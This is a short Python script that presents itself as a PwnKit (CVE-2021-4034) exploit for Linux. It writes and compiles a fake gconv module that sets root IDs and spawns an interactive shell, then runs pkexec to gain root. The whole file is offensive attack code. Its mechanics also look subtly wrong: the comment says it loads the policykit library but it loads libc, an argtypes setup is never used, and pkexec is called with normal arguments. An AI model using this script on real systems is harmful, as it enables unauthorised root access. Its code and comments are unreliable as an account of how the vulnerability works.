# CVE-2021-4034 PwnKit - Python implementation
# Source: https://github.com/ly4k/PwnKit
import os
import sys
import ctypes

# Load vulnerable policykit library
so = ctypes.CDLL("libc.so.6")
so.execvp.argtypes = ctypes.c_char_p, ctypes.c_char_p

# Set up environment to trigger GCONV_PATH injection
os.environ["GCONV_PATH"] = "/tmp/pwnkit"
os.environ["CHARSET"] = "id"
os.environ["SHELL"] = "/tmp/pwnkit/x"
os.makedirs("/tmp/pwnkit/x", exist_ok=True)

# Write a fake gconv module 'id.so' that simply spawns a shell
with open("/tmp/pwnkit/gconv-modules", "w") as f:
    f.write("module  UTF-8//  INTERNAL  id  1\n")

with open("/tmp/pwnkit/id.c", "w") as f:
    f.write("""
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
void gconv(void) {}
void gconv_init(void) {
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    system("/bin/sh -i");
    _exit(0);
}
""")

os.system("gcc -shared -o /tmp/pwnkit/id.so /tmp/pwnkit/id.c -nostartfiles -fPIC")
os.execvp("/usr/bin/pkexec", ["pkexec", "--user", "root", "/bin/sh"])
